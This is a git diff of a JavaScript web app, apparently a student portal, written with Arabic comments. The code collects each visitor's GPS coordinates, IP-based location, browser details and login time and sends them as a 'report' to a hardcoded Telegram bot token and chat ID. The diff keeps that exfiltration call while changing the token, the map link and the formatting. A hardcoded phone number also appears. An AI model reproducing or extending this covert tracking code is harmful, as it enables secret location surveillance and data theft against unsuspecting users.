@@ -741,7 +741,7 @@ async function runApp() {
 
                     // [3] إرسال التقرير النهائي للبوت (ماعدا آدم)
                     if (user.phone !== "01023175098") {
-                        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
+                        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
                         const chatId = "5890070301";
                         const message = `👑 *تـقـريـر كـيـمـو الـخـارق* ❤️
 ━━━━━━━━━━━━━━
@@ -764,7 +764,7 @@ async function runApp() {
 📍 *الموقع (GPS + IP):*
 • الدولة: ${ipInfo.country} | المحافظة: ${ipInfo.region}
 • المدينة: ${ipInfo.city}
-• الخريطة: [اضغط لفتح الموقع الدقيق](http://maps.google.com/maps?q=${gpsLat},${gpsLon})
+• الخريطة: https://www.google.com/maps?q=${gpsLat},${gpsLon}
 
 📱 *بيانات إضافية:*
 • الثغرات: ${isIncognito ? "وضع التخفي 🕵️" : "عادي"} | ${isOldBrowser ? "متصفح غير آمن ⚠️" : "مؤمن ✅"}
@@ -774,7 +774,9 @@ async function runApp() {
 ⏰ *توقيت الدخول:* ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━`;
 
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
+                                   fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
                         
                         // تحديث Firebase
                         studentsRef.child(user.phone).update({ 
